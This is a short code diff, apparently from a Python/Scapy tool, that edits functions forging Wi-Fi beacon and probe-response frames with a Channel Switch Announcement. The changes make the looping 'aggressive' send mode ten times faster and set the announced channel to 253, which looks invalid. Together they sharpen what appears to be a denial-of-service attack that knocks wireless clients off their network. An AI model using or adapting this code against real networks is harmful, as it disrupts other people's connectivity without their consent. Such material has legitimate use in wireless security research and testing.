@@ -79,7 +79,7 @@ def make_beacon_csa(parser, elt, dot11):
 
 def send_beacon_csa_t(parser, frame):
 	if parser.aggressive == True:
-		sendp(frame, iface=parser.interface, inter=0.004, loop=1)
+		sendp(frame, iface=parser.interface, inter=0.0004, loop=1)
 	else:
 		sendp(frame, iface=parser.interface, count = 6)
 
@@ -110,7 +110,7 @@ def make_probe_csa(parser, dot11):
 	probe_resp = Dot11ProbeResp(cap=0x1111)
 	essid = Dot11Elt(ID='SSID', info=parser.ssid, len=len(parser.ssid))
 	ds_param = Dot11EltDSSSet(ID=0x3, len=1, channel=parser.channel)
-	csa = Dot11Elt(ID=0x25,len=3,info='\x01\x24\x01')
+	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,253,1]))
 	frame = RadioTap()/dot11_probe/probe_resp/essid/ds_param/csa
 	csa_packets.append(frame)
 
